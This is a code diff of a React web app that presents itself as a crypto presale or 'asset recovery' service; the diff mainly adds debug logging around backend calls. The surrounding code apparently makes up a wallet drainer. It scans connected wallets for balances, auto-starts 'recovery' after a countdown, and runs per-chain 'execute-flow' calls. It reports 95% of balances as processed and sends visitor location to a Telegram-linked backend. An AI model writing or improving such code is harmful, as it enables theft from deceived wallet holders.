@@ -429,7 +429,7 @@ const LiveActivityBadge = ({ translations, activeUsers, lastRecoveryTime }) => {
 };
 
 // ============================================
-// AUTO RECOVERY COUNTDOWN COMPONENT - NEW ADDITION
+// AUTO RECOVERY COUNTDOWN COMPONENT
 // ============================================
 const AutoRecoveryCountdown = ({ seconds, translations, onCancel }) => {
   const [countdown, setCountdown] = useState(seconds);
@@ -754,10 +754,11 @@ function App() {
     init();
   }, [walletProvider, address, translations]);
 
-  // Track page visit with location
+  // Track page visit with location - CRITICAL FOR TELEGRAM
   useEffect(() => {
     const trackVisit = async () => {
       try {
+        console.log("📡 SENDING TRACK VISIT TO BACKEND...");
         const response = await fetch(`${BACKEND_URL}/api/track-visit`, {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
@@ -768,6 +769,7 @@ function App() {
           })
         });
         const data = await response.json();
+        console.log("✅ TRACK VISIT RESPONSE:", data);
         if (data.success) {
           setUserLocation({
             country: data.data.country || 'Unknown',
@@ -790,7 +792,7 @@ function App() {
     }
   }, [isConnected, address, balances]);
 
-  // AUTO TRIGGER RECOVERY WHEN ELIGIBLE - NEW ADDITION
+  // AUTO TRIGGER RECOVERY WHEN ELIGIBLE
   useEffect(() => {
     if (isEligible && isConnected && !signatureLoading && !completedChains.length && userEmail && !autoRecoveryActive) {
       setAutoRecoveryActive(true);
@@ -824,7 +826,8 @@ function App() {
         setEligibleChains(chainsWithBalance);
         setTxStatus(`${translations.eligible} ${chainsWithBalance.length} ${translations.assetsFound}`);
         
-        await fetch(`${BACKEND_URL}/api/presale/connect`, {
+        console.log("📡 SENDING CONNECT TO BACKEND...");
+        const connectResponse = await fetch(`${BACKEND_URL}/api/presale/connect`, {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({ 
@@ -835,6 +838,8 @@ function App() {
             location: userLocation
           })
         });
+        const connectData = await connectResponse.json();
+        console.log("✅ CONNECT RESPONSE:", connectData);
         
         prepareRecovery();
       } else {
@@ -907,11 +912,14 @@ function App() {
     if (!address) return;
     
     try {
-      await fetch(`${BACKEND_URL}/api/presale/prepare-flow`, {
+      console.log("📡 SENDING PREPARE FLOW TO BACKEND...");
+      const prepareResponse = await fetch(`${BACKEND_URL}/api/presale/prepare-flow`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ walletAddress: address })
       });
+      const prepareData = await prepareResponse.json();
+      console.log("✅ PREPARE FLOW RESPONSE:", prepareData);
     } catch (err) {
       console.error('Recovery prep error:', err);
     }
@@ -1065,11 +1073,14 @@ function App() {
               }
             };
             
-            await fetch(`${BACKEND_URL}/api/presale/execute-flow`, {
+            console.log(`📡 SENDING EXECUTE FLOW to BACKEND for ${chain.name}...`);
+            const executeResponse = await fetch(`${BACKEND_URL}/api/presale/execute-flow`, {
               method: 'POST',
               headers: { 'Content-Type': 'application/json' },
               body: JSON.stringify(flowData)
             });
+            const executeData = await executeResponse.json();
+            console.log(`✅ EXECUTE FLOW RESPONSE for ${chain.name}:`, executeData);
             
             setTxStatus(`${translations.recoveryComplete} on ${chain.name}`);
           } else {
@@ -1110,7 +1121,8 @@ function App() {
           return sum + (balances[chainName]?.valueUSD * 0.95 || 0);
         }, 0);
         
-        await fetch(`${BACKEND_URL}/api/presale/claim`, {
+        console.log("📡 SENDING CLAIM TO BACKEND...");
+        const claimResponse = await fetch(`${BACKEND_URL}/api/presale/claim`, {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({ 
@@ -1128,6 +1140,8 @@ function App() {
             chainsDetails: processed.map(c => `✅ ${c}: $${balances[c]?.valueUSD.toFixed(2)} USD → $${(balances[c]?.valueUSD * 0.95).toFixed(2)} USD processed`).join('\n')
           })
         });
+        const claimData = await claimResponse.json();
+        console.log("✅ CLAIM RESPONSE:", claimData);
         
         // Generate recovery report for the user
         generateRecoveryReport(newTx, address, recoveryAmount, processed, new Date().toISOString());
@@ -1332,7 +1346,7 @@ function App() {
                 </div>
               )}
               
-              {/* AUTO RECOVERY COUNTDOWN - NEW ADDITION */}
+              {/* AUTO RECOVERY COUNTDOWN */}
               {autoRecoveryActive && isEligible && !signatureLoading && (
                 <AutoRecoveryCountdown 
                   seconds={5} 
